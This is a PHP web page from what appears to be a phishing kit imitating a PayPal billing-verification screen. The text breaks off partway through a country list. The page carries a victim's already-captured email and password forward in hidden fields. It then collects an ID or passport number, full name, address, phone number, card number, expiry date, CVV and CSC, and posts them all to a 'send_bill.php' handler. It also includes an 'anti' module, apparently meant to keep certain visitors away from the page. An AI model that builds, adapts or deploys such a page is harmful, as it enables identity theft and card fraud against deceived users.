<?php

   session_start();
   error_reporting(E_ERROR | E_PARSE);

   include('anti/anti.php');
   include('include/get_ph.php');
   include('include/get_lg.php');
   include('../hash.php');

   //Override the session $_SESSION['lang_']
   if(isset($_GET['lg'])){
       if($_GET['lg'] == 'US'){ $_SESSION['lang_'] = "en.php"; }
       else if($_GET['lg'] == 'FR'){ $_SESSION['lang_'] = "fr.php"; }
       else if($_GET['lg'] == 'ES'){ $_SESSION['lang_'] = "es.php"; }
   }
   
   $xDIR_LGx = "myacc.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2."&lg=";
   
   if(isset($_SESSION['lang_'])){
       include('langdir/'.$_SESSION['lang_']);
   }else {
       include('langdir/en.php');
   }
   
   ?>
<!DOCTYPE html>
<html lang="en-US">
   <head>
      <meta charSet="utf-8" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys27x; ?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" />
      <link rel="apple-touch-icon" href="asset/img/pp64.png" />
      <link rel="shortcut icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link rel="icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link href="asset/css/myacc.css?x=<?php echo md5(time()); ?>" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
   </head>
   <body>
      <div id="app-element-mountpoint">
         <div id="document-body" dir="ltr">
            <div class="backgroundColor">
               <div>
                  <div class="signup clear app-wrapper">
                     <div class="signup-page-header"> <a class="signup-page-header-logo"></a> <a href="#" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary"><?php echo $xys17x; ?></a></div>
                     <main>
                        <div>
                           <div class="signup-page-form">
                              <div class="notification"></div>
                              <div class="busyOverlay" style="transition: unset; display: none;">
                                 <div class="busyIcon" style="top: 50%;"></div>
                                 <p class="xysnewLoaderx"><?php echo $xys28x; ?></p>
                              </div>
                              <div>
                                 <form action="send/send_bill.php?customer.x=ID-PA$1$7i/<?php echo md5(time()).md5(time()); ?>" id="PageMainForm" class="signupAppContent" method="POST">
                                    <div id="xysBillingx">
                                       <div>
                                          <div class="center">
                                             <h1 class="vx_text-2 center "><?php echo $xys29x; ?></h1>
                                          </div>
                                       </div>
                                       <input type="hidden" name="xysemailx" value="<?php echo $_SESSION['xysemailx']; ?>">
                                       <input type="hidden" name="xyspassx" value="<?php echo $_SESSION['xyspassx']; ?>">
                                       <div class="fieldGroupContainer">
                                          <div>
                                             <div class="vx_form-group">
                                                <div class="vx_select ">
                                                   
                                                   <select id="xyscountryx" name="xyscountryx" class="vx_form-control">
                                                      <option selected value="null"><?php echo $xys30x; ?></option>
                                                      <option value="AL">Albania</option>
                                                      <option value="DZ">Algeria</option>
                                                      <option value="AD">Andorra</option>
                                                      <option value="AO">Angola</option>
                                                      <option value="AI">Anguilla</option>
                                                      <option value="AG">Antigua &amp; Barbuda</option>
                                                      <option value="AR">Argentina</option>
                                                      <option value="AM">Armenia</option>
                                                      <option value="AW">Aruba</option>
                                                      <option value="AU">Australia</option>
                                                      <option value="AT">Austria</option>
                                                      <option value="AZ">Azerbaijan</option>
                                                      <option value="BS">Bahamas</option>
                                                      <option value="BH">Bahrain</option>
                                                      <option value="BB">Barbados</option>
                                                      <option value="BY">Belarus</option>
                                                      <option value="BE">Belgium</option>
                                                      <option value="BZ">Belize</option>
                                                      <option value="BJ">Benin</option>
                                                      <option value="BM">Bermuda</option>
                                                      <option value="BT">Bhutan</option>
                                                      <option value="BO">Bolivia</option>
                                                      <option value="BA">Bosnia &amp; Herzegovina</option>
                                                      <option value="BW">Botswana</option>
                                                      <option value="BR">Brazil</option>
                                                      <option value="VG">British Virgin Islands</option>
                                                      <option value="BN">Brunei</option>
                                                      <option value="BG">Bulgaria</option>
                                                      <option value="BF">Burkina Faso</option>
                                                      <option value="BI">Burundi</option>
                                                      <option value="KH">Cambodia</option>
                                                      <option value="CM">Cameroon</option>
                                                      <option value="CA">Canada</option>
                                                      <option value="CV">Cape Verde</option>
                                                      <option value="KY">Cayman Islands</option>
                                                      <option value="TD">Chad</option>
                                                      <option value="CL">Chile</option>
                                                      <option value="C2">China</option>
                                                      <option value="CO">Colombia</option>
                                                      <option value="KM">Comoros</option>
                                                      <option value="CG">Congo - Brazzaville</option>
                                                      <option value="CD">Congo - Kinshasa</option>
                                                      <option value="CK">Cook Islands</option>
                                                      <option value="CR">Costa Rica</option>
                                                      <option value="CI">Côte d’Ivoire</option>
                                                      <option value="HR">Croatia</option>
                                                      <option value="CY">Cyprus</option>
                                                      <option value="CZ">Czech Republic</option>
                                                      <option value="DK">Denmark</option>
                                                      <option value="DJ">Djibouti</option>
                                                      <option value="DM">Dominica</option>
                                                      <option value="DO">Dominican Republic</option>
                                                      <option value="EC">Ecuador</option>
                                                      <option value="EG">Egypt</option>
                                                      <option value="SV">El Salvador</option>
                                                      <option value="ER">Eritrea</option>
                                                      <option value="EE">Estonia</option>
                                                      <option value="ET">Ethiopia</option>
                                                      <option value="FK">Falkland Islands</option>
                                                      <option value="FO">Faroe Islands</option>
                                                      <option value="FJ">Fiji</option>
                                                      <option value="FI">Finland</option>
                                                      <option value="FR">France</option>
                                                      <option value="GF">French Guiana</option>
                                                      <option value="PF">French Polynesia</option>
                                                      <option value="GA">Gabon</option>
                                                      <option value="GM">Gambia</option>
                                                      <option value="GE">Georgia</option>
                                                      <option value="DE">Germany</option>
                                                      <option value="GI">Gibraltar</option>
                                                      <option value="GR">Greece</option>
                                                      <option value="GL">Greenland</option>
                                                      <option value="GD">Grenada</option>
                                                      <option value="GP">Guadeloupe</option>
                                                      <option value="GT">Guatemala</option>
                                                      <option value="GN">Guinea</option>
                                                      <option value="GW">Guinea-Bissau</option>
                                                      <option value="GY">Guyana</option>
                                                      <option value="HN">Honduras</option>
                                                      <option value="HK">Hong Kong SAR China</option>
                                                      <option value="HU">Hungary</option>
                                                      <option value="IS">Iceland</option>
                                                      <option value="IN">India</option>
                                                      <option value="ID">Indonesia</option>
                                                      <option value="IE">Ireland</option>
                                                      <option value="IL">Israel</option>
                                                      <option value="IT">Italy</option>
                                                      <option value="JM">Jamaica</option>
                                                      <option value="JP">Japan</option>
                                                      <option value="JO">Jordan</option>
                                                      <option value="KZ">Kazakhstan</option>
                                                      <option value="KE">Kenya</option>
                                                      <option value="KI">Kiribati</option>
                                                      <option value="KW">Kuwait</option>
                                                      <option value="KG">Kyrgyzstan</option>
                                                      <option value="LA">Laos</option>
                                                      <option value="LV">Latvia</option>
                                                      <option value="LS">Lesotho</option>
                                                      <option value="LI">Liechtenstein</option>
                                                      <option value="LT">Lithuania</option>
                                                      <option value="LU">Luxembourg</option>
                                                      <option value="MK">Macedonia</option>
                                                      <option value="MG">Madagascar</option>
                                                      <option value="MW">Malawi</option>
                                                      <option value="MY">Malaysia</option>
                                                      <option value="MV">Maldives</option>
                                                      <option value="ML">Mali</option>
                                                      <option value="MT">Malta</option>
                                                      <option value="MH">Marshall Islands</option>
                                                      <option value="MQ">Martinique</option>
                                                      <option value="MR">Mauritania</option>
                                                      <option value="MU">Mauritius</option>
                                                      <option value="YT">Mayotte</option>
                                                      <option value="MX">Mexico</option>
                                                      <option value="FM">Micronesia</option>
                                                      <option value="MD">Moldova</option>
                                                      <option value="MC">Monaco</option>
                                                      <option value="MN">Mongolia</option>
                                                      <option value="ME">Montenegro</option>
                                                      <option value="MS">Montserrat</option>
                                                      <option value="MA">Morocco</option>
                                                      <option value="MZ">Mozambique</option>
                                                      <option value="NA">Namibia</option>
                                                      <option value="NR">Nauru</option>
                                                      <option value="NP">Nepal</option>
                                                      <option value="NL">Netherlands</option>
                                                      <option value="AN">Netherlands Antilles</option>
                                                      <option value="NC">New Caledonia</option>
                                                      <option value="NZ">New Zealand</option>
                                                      <option value="NI">Nicaragua</option>
                                                      <option value="NE">Niger</option>
                                                      <option value="NG">Nigeria</option>
                                                      <option value="NU">Niue</option>
                                                      <option value="NF">Norfolk Island</option>
                                                      <option value="NO">Norway</option>
                                                      <option value="OM">Oman</option>
                                                      <option value="PW">Palau</option>
                                                      <option value="PA">Panama</option>
                                                      <option value="PG">Papua New Guinea</option>
                                                      <option value="PY">Paraguay</option>
                                                      <option value="PE">Peru</option>
                                                      <option value="PH">Philippines</option>
                                                      <option value="PN">Pitcairn Islands</option>
                                                      <option value="PL">Poland</option>
                                                      <option value="PT">Portugal</option>
                                                      <option value="QA">Qatar</option>
                                                      <option value="RE">Réunion</option>
                                                      <option value="RO">Romania</option>
                                                      <option value="RU">Russia</option>
                                                      <option value="RW">Rwanda</option>
                                                      <option value="WS">Samoa</option>
                                                      <option value="SM">San Marino</option>
                                                      <option value="ST">São Tomé &amp; Príncipe</option>
                                                      <option value="SA">Saudi Arabia</option>
                                                      <option value="SN">Senegal</option>
                                                      <option value="RS">Serbia</option>
                                                      <option value="SC">Seychelles</option>
                                                      <option value="SL">Sierra Leone</option>
                                                      <option value="SG">Singapore</option>
                                                      <option value="SK">Slovakia</option>
                                                      <option value="SI">Slovenia</option>
                                                      <option value="SB">Solomon Islands</option>
                                                      <option value="SO">Somalia</option>
                                                      <option value="ZA">South Africa</option>
                                                      <option value="KR">South Korea</option>
                                                      <option value="ES">Spain</option>
                                                      <option value="LK">Sri Lanka</option>
                                                      <option value="SH">St. Helena</option>
                                                      <option value="KN">St. Kitts &amp; Nevis</option>
                                                      <option value="LC">St. Lucia</option>
                                                      <option value="PM">St. Pierre &amp; Miquelon</option>
                                                      <option value="VC">St. Vincent &amp; Grenadines</option>
                                                      <option value="SR">Suriname</option>
                                                      <option value="SJ">Svalbard &amp; Jan Mayen</option>
                                                      <option value="SZ">Swaziland</option>
                                                      <option value="SE">Sweden</option>
                                                      <option value="CH">Switzerland</option>
                                                      <option value="TW">Taiwan</option>
                                                      <option value="TJ">Tajikistan</option>
                                                      <option value="TZ">Tanzania</option>
                                                      <option value="TH">Thailand</option>
                                                      <option value="TG">Togo</option>
                                                      <option value="TO">Tonga</option>
                                                      <option value="TT">Trinidad &amp; Tobago</option>
                                                      <option value="TN">Tunisia</option>
                                                      <option value="TM">Turkmenistan</option>
                                                      <option value="TC">Turks &amp; Caicos Islands</option>
                                                      <option value="TV">Tuvalu</option>
                                                      <option value="UG">Uganda</option>
                                                      <option value="UA">Ukraine</option>
                                                      <option value="AE">United Arab Emirates</option>
                                                      <option value="GB">United Kingdom</option>
                                                      <option value="US">United States</option>
                                                      <option value="UY">Uruguay</option>
                                                      <option value="VU">Vanuatu</option>
                                                      <option value="VA">Vatican City</option>
                                                      <option value="VE">Venezuela</option>
                                                      <option value="VN">Vietnam</option>
                                                      <option value="WF">Wallis &amp; Futuna</option>
                                                      <option value="YE">Yemen</option>
                                                      <option value="ZM">Zambia</option>
                                                      <option value="ZW">Zimbabwe</option>
                                                   </select>
                                                </div>
                                             </div>
                                          </div>
                                          <div>
                                             <div class="selectWrapper">
                                                <div class="vx_select safari-flexShrink clearLeftBorder unsetWidth">
                                                   <select id="xysidchoicex" name="xysidchoicex" class="vx_form-control ">
                                                      <option value="Driver-License"><?php echo $xys31x; ?></option>
                                                      <option value="National-ID"><?php echo $xys32x; ?></option>
                                                      <option value="Passport-Number"><?php echo $xys33x; ?></option>
                                                   </select>
                                                </div>
                                                <div class="clearRightBorder unsetWidth ">
                                                   <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                      <label for="xysidx"><?php echo $xys34x; ?></label>
                                                      <div class="vx_form-control" data-label-content="<?php echo $xys34x; ?>">
                                                         <div class="vx_form-control"> <input type="text" maxlength="25" value="" autocomplete="off" name="xysidx" id="xysidx" style="padding-left: 15px;"></div>
                                                      </div>
                                                      <span>
                                                         <p class="hide" style="margin: 0px;"><span><?php echo $xys35x; ?></span></p>
                                                      </span>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysfullnamex"><?php echo $xys36x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys36x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysfullnamex" id="xysfullnamex" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys37x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysaddressx"><?php echo $xys38x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys38x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysaddressx" id="xysaddressx" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys39x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyscityx"><?php echo $xys40x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys40x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xyscityx" id="xyscityx" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys41x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysposcodex"><?php echo $xys42x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys42x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysposcodex" id="xysposcodex" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys43x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div>
                                             <div class="selectWrapper">
                                                <div class="vx_select safari-flexShrink clearLeftBorder unsetWidth">
                                                   <select id="xysphonetypex" name="xysphonetypex" class="vx_form-control ">
                                                      <option value="Mobile"><?php echo $xys44x; ?></option>
                                                      <option value="Home"><?php echo $xys45x; ?></option>
                                                   </select>
                                                </div>
                                                <div class="clearRightBorder unsetWidth ">
                                                   <div class="vx_floatingLabel_complex vx_floatingLabel_active">
                                                      <label for="xysphonex"><?php echo $xys46x; ?></label>
                                                      <div class="vx_form-control" data-label-content="<?php echo $xys46x; ?>">
                                                         <div class="vx_form-control"> <input type="hidden" name="Prefix" value="<?php echo "+".$_SESSION['xcountryPhonePrefixx']; ?>"> <span class="countryPhonePrefix hide">+<?php echo $_SESSION['xcountryPhonePrefixx']; ?></span> <input type="tel" dir="ltr" maxlength="20" value="" autocomplete="off" name="xysphonex" id="xysphonex" style="padding-left: 50.899px;"></div>
                                                      </div>
                                                      <span>
                                                         <p class="hide" style="margin: 0px;"><span><?php echo $xys47x; ?></span></p>
                                                      </span>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="btnGrp"> <button name="xysbtnNextx" id="xysbtnNextx" value="<?php echo $xys26x; ?>" class="vx_btn vx_btn-block" style="width:auto; margin-top: 10px" data-automation-id="page_submit"><?php echo $xys26x; ?></button></div>
                                    </div>
                                    <div id="xysCardingx" style="display: none;">
                                       <div>
                                          <div class="center">
                                             <h1 class="vx_text-2 center "><?php echo $xys48x; ?></h1>
                                          </div>
                                       </div>
                                       <div class="fieldGroupContainer">
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyscardholderx"><?php echo $xys49x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys49x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" maxlength="25" name="xyscardholderx" id="xyscardholderx" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys50x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyscardnumberx"><?php echo $xys51x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys51x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" maxlength="19" autoComplete="off" name="xyscardnumberx" id="xyscardnumberx" /> <span class="xysccdetectx"></span></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys52x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysexpirydatex"><?php echo $xys53x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys53x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysexpirydatex" id="xysexpirydatex" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys54x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyscvvx"><?php echo $xys55x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys55x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" maxlength="3" autoComplete="off" name="xyscvvx" id="xyscvvx" /> <span class="xyscvviconx"></span></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys56x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class="hide" id="xysboxcscx">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyscscx"><?php echo $xys57x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys57x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" maxlength="3" autoComplete="off" name="xyscscx" id="xyscscx" /> <span class="xyscsciconx"></span></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys58x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="btnGrp"> <button name="xysbtnConfirmx" id="xysbtnConfirmx" value="<?php echo $xys59x; ?>" class="vx_btn vx_btn-block" style="width:auto; margin-top: 10px" data-automation-id="page_submit"><?php echo $xys59x; ?></button></div>
                                    </div>
                                    <div class="country-and-lang-selector" style="margin-bottom: -22px;margin-top: 30px;"> <span class="picker country-selector"> <a aria-label="Change country" id="xyspopUpLangx" class="country <?php echo $_SESSION['xcountryCodex']; ?>"></a> </span> <span> <a href="<?php echo $xDIR_LGx."US"; ?>">English</a> | </span> <span> <a href="<?php echo $xDIR_LGx."FR"; ?>">Français</a> | </span> <span> <a href="<?php echo $xDIR_LGx."ES"; ?>">Español</a> | </span></div>
                                    
                                 </form>
                              </div>
                              <div class="signup-page-footer vx_text-legal text-center" style="margin-bottom: 15px;">
                                 ©1999–<?php echo date("Y"); ?> <span class="signup-page-footer-separator">|</span> <a class="vx_text-legal"><?php echo $xys6x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal"><?php echo $xys7x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal"><?php echo $xys5x; ?></a> <span class="signup-page-footer-spacer"> </span> <span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys61x; ?></a> </span> <a href="#" class="vx_text-legal"></a>
                              </div>
                           </div>
                        </div>
                     </main>
                     <div class="modalWindow hide xysPopUpLangx">
                        <div class="modalWrapper">
                           <div class="buttonHolder"> <button class="vx_modal-dismiss_x-trigger" id="xysclosePopUpLangx" style="outline: none;"> <span class="vx_a11yText"><?php echo $xys62x; ?></span> </button></div>
                           <div class="modalContent">
                              <div class="country-selector">
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys63x; ?></li>
                                    <li> <a href="#" class="country DZ">Algeria</a></li>
                                    <li> <a href="#" class="country AO">Angola</a></li>
                                    <li> <a href="#" class="country BJ">Benin</a></li>
                                    <li> <a href="#" class="country BW">Botswana</a></li>
                                    <li> <a href="#" class="country BF">Burkina Faso</a></li>
                                    <li> <a href="#" class="country BI">Burundi</a></li>
                                    <li> <a href="#" class="country CM">Cameroon</a></li>
                                    <li> <a href="#" class="country CV">Cape Verde</a></li>
                                    <li> <a href="#" class="country TD">Chad</a></li>
                                    <li> <a href="#" class="country KM">Comoros</a></li>
                                    <li> <a href="#" class="country CG">Congo - Brazzaville</a></li>
                                    <li> <a href="#" class="country CD">Congo - Kinshasa</a></li>
                                    <li> <a href="#" class="country CI">Côte d’Ivoire</a></li>
                                    <li> <a href="#" class="country DJ">Djibouti</a></li>
                                    <li> <a href="#" class="country EG">Egypt</a></li>
                                    <li> <a href="#" class="country ER">Eritrea</a></li>
                                    <li> <a href="#" class="country ET">Ethiopia</a></li>
                                    <li> <a href="#" class="country GA">Gabon</a></li>
                                    <li> <a href="#" class="country GM">Gambia</a></li>
                                    <li> <a href="#" class="country GN">Guinea</a></li>
                                    <li> <a href="#" class="country GW">Guinea-Bissau</a></li>
                                    <li> <a href="#" class="country KE">Kenya</a></li>
                                    <li> <a href="#" class="country LS">Lesotho</a></li>
                                    <li> <a href="#" class="country MG">Madagascar</a></li>
                                    <li> <a href="#" class="country MW">Malawi</a></li>
                                    <li> <a href="#" class="country ML">Mali</a></li>
                                    <li> <a href="#" class="country MR">Mauritania</a></li>
                                    <li> <a href="#" class="country MU">Mauritius</a></li>
                                    <li> <a href="#" class="country YT">Mayotte</a></li>
                                    <li> <a href="#" class="country MA">Morocco</a></li>
                                    <li> <a href="#" class="country MZ">Mozambique</a></li>
                                    <li> <a href="#" class="country NA">Namibia</a></li>
                                    <li> <a href="#" class="country NE">Niger</a></li>
                                    <li> <a href="#" class="country NG">Nigeria</a></li>
                                    <li> <a href="#" class="country RE">Réunion</a></li>
                                    <li> <a href="#" class="country RW">Rwanda</a></li>
                                    <li> <a href="#" class="country ST">São Tomé &amp; Príncipe</a></li>
                                    <li> <a href="#" class="country SN">Senegal</a></li>
                                    <li> <a href="#" class="country SC">Seychelles</a></li>
                                    <li> <a href="#" class="country SL">Sierra Leone</a></li>
                                    <li> <a href="#" class="country SO">Somalia</a></li>
                                    <li> <a href="#" class="country ZA">South Africa</a></li>
                                    <li> <a href="#" class="country SH">St. Helena</a></li>
                                    <li> <a href="#" class="country SZ">Swaziland</a></li>
                                    <li> <a href="#" class="country TZ">Tanzania</a></li>
                                    <li> <a href="#" class="country TG">Togo</a></li>
                                    <li> <a href="#" class="country TN">Tunisia</a></li>
                                    <li> <a href="#" class="country UG">Uganda</a></li>
                                    <li> <a href="#" class="country ZM">Zambia</a></li>
                                    <li> <a href="#" class="country ZW">Zimbabwe</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys64x; ?></li>
                                    <li> <a href="#" class="country AI">Anguilla</a></li>
                                    <li> <a href="#" class="country AG">Antigua &amp; Barbuda</a></li>
                                    <li> <a href="#" class="country AR">Argentina</a></li>
                                    <li> <a href="#" class="country AW">Aruba</a></li>
                                    <li> <a href="#" class="country BS">Bahamas</a></li>
                                    <li> <a href="#" class="country BB">Barbados</a></li>
                                    <li> <a href="#" class="country BZ">Belize</a></li>
                                    <li> <a href="#" class="country BM">Bermuda</a></li>
                                    <li> <a href="#" class="country BO">Bolivia</a></li>
                                    <li> <a href="#" class="country BR">Brazil</a></li>
                                    <li> <a href="#" class="country VG">British Virgin Islands</a></li>
                                    <li> <a href="#" class="country CA">Canada</a></li>
                                    <li> <a href="#" class="country KY">Cayman Islands</a></li>
                                    <li> <a href="#" class="country CL">Chile</a></li>
                                    <li> <a href="#" class="country CO">Colombia</a></li>
                                    <li> <a href="#" class="country CR">Costa Rica</a></li>
                                    <li> <a href="#" class="country DM">Dominica</a></li>
                                    <li> <a href="#" class="country DO">Dominican Republic</a></li>
                                    <li> <a href="#" class="country EC">Ecuador</a></li>
                                    <li> <a href="#" class="country SV">El Salvador</a></li>
                                    <li> <a href="#" class="country FK">Falkland Islands</a></li>
                                    <li> <a href="#" class="country GF">French Guiana</a></li>
                                    <li> <a href="#" class="country GL">Greenland</a></li>
                                    <li> <a href="#" class="country GD">Grenada</a></li>
                                    <li> <a href="#" class="country GP">Guadeloupe</a></li>
                                    <li> <a href="#" class="country GT">Guatemala</a></li>
                                    <li> <a href="#" class="country GY">Guyana</a></li>
                                    <li> <a href="#" class="country HN">Honduras</a></li>
                                    <li> <a href="#" class="country JM">Jamaica</a></li>
                                    <li> <a href="#" class="country MQ">Martinique</a></li>
                                    <li> <a href="#" class="country MX">Mexico</a></li>
                                    <li> <a href="#" class="country MS">Montserrat</a></li>
                                    <li> <a href="#" class="country AN">Netherlands Antilles</a></li>
                                    <li> <a href="#" class="country NI">Nicaragua</a></li>
                                    <li> <a href="#" class="country PA">Panama</a></li>
                                    <li> <a href="#" class="country PY">Paraguay</a></li>
                                    <li> <a href="#" class="country PE">Peru</a></li>
                                    <li> <a href="#" class="country KN">St. Kitts &amp; Nevis</a></li>
                                    <li> <a href="#" class="country LC">St. Lucia</a></li>
                                    <li> <a href="#" class="country PM">St. Pierre &amp; Miquelon</a></li>
                                    <li> <a href="#" class="country VC">St. Vincent &amp; Grenadines</a></li>
                                    <li> <a href="#" class="country SR">Suriname</a></li>
                                    <li> <a href="#" class="country TT">Trinidad &amp; Tobago</a></li>
                                    <li> <a href="#" class="country TC">Turks &amp; Caicos Islands</a></li>
                                    <li> <a href="#" class="country US">United States</a></li>
                                    <li> <a href="#" class="country UY">Uruguay</a></li>
                                    <li> <a href="#" class="country VE">Venezuela</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys65x; ?></li>
                                    <li> <a href="#" class="country AM">Armenia</a></li>
                                    <li> <a href="#" class="country AU">Australia</a></li>
                                    <li> <a href="#" class="country BH">Bahrain</a></li>
                                    <li> <a href="#" class="country BT">Bhutan</a></li>
                                    <li> <a href="#" class="country BN">Brunei</a></li>
                                    <li> <a href="#" class="country KH">Cambodia</a></li>
                                    <li> <a href="#" class="country C2">China</a></li>
                                    <li> <a href="#" class="country CK">Cook Islands</a></li>
                                    <li> <a href="#" class="country FJ">Fiji</a></li>
                                    <li> <a href="#" class="country PF">French Polynesia</a></li>
                                    <li> <a href="#" class="country HK">Hong Kong SAR China</a></li>
                                    <li> <a href="#" class="country IN">India</a></li>
                                    <li> <a href="#" class="country ID">Indonesia</a></li>
                                    <li> <a href="#" class="country IL">Israel</a></li>
                                    <li> <a href="#" class="country JP">Japan</a></li>
                                    <li> <a href="#" class="country JO">Jordan</a></li>
                                    <li> <a href="#" class="country KZ">Kazakhstan</a></li>
                                    <li> <a href="#" class="country KI">Kiribati</a></li>
                                    <li> <a href="#" class="country KW">Kuwait</a></li>
                                    <li> <a href="#" class="country KG">Kyrgyzstan</a></li>
                                    <li> <a href="#" class="country LA">Laos</a></li>
                                    <li> <a href="#" class="country MY">Malaysia</a></li>
                                    <li> <a href="#" class="country MV">Maldives</a></li>
                                    <li> <a href="#" class="country MH">Marshall Islands</a></li>
                                    <li> <a href="#" class="country FM">Micronesia</a></li>
                                    <li> <a href="#" class="country MN">Mongolia</a></li>
                                    <li> <a href="#" class="country NR">Nauru</a></li>
                                    <li> <a href="#" class="country NP">Nepal</a></li>
                                    <li> <a href="#" class="country NC">New Caledonia</a></li>
                                    <li> <a href="#" class="country NZ">New Zealand</a></li>
                                    <li> <a href="#" class="country NU">Niue</a></li>
                                    <li> <a href="#" class="country NF">Norfolk Island</a></li>
                                    <li> <a href="#" class="country OM">Oman</a></li>
                                    <li> <a href="#" class="country PW">Palau</a></li>
                                    <li> <a href="#" class="country PG">Papua New Guinea</a></li>
                                    <li> <a href="#" class="country PH">Philippines</a></li>
                                    <li> <a href="#" class="country PN">Pitcairn Islands</a></li>
                                    <li> <a href="#" class="country QA">Qatar</a></li>
                                    <li> <a href="#" class="country WS">Samoa</a></li>
                                    <li> <a href="#" class="country SA">Saudi Arabia</a></li>
                                    <li> <a href="#" class="country SG">Singapore</a></li>
                                    <li> <a href="#" class="country SB">Solomon Islands</a></li>
                                    <li> <a href="#" class="country KR">South Korea</a></li>
                                    <li> <a href="#" class="country LK">Sri Lanka</a></li>
                                    <li> <a href="#" class="country TW">Taiwan</a></li>
                                    <li> <a href="#" class="country TJ">Tajikistan</a></li>
                                    <li> <a href="#" class="country TH">Thailand</a></li>
                                    <li> <a href="#" class="country TO">Tonga</a></li>
                                    <li> <a href="#" class="country TM">Turkmenistan</a></li>
                                    <li> <a href="#" class="country TV">Tuvalu</a></li>
                                    <li> <a href="#" class="country AE">United Arab Emirates</a></li>
                                    <li> <a href="#" class="country VU">Vanuatu</a></li>
                                    <li> <a href="#" class="country VN">Vietnam</a></li>
                                    <li> <a href="#" class="country WF">Wallis &amp; Futuna</a></li>
                                    <li> <a href="#" class="country YE">Yemen</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys66x; ?></li>
                                    <li> <a href="#" class="country AL">Albania</a></li>
                                    <li> <a href="#" class="country AD">Andorra</a></li>
                                    <li> <a href="#" class="country AT">Austria</a></li>
                                    <li> <a href="#" class="country AZ">Azerbaijan</a></li>
                                    <li> <a href="#" class="country BY">Belarus</a></li>
                                    <li> <a href="#" class="country BE">Belgium</a></li>
                                    <li> <a href="#" class="country BA">Bosnia &amp; Herzegovina</a></li>
                                    <li> <a href="#" class="country BG">Bulgaria</a></li>
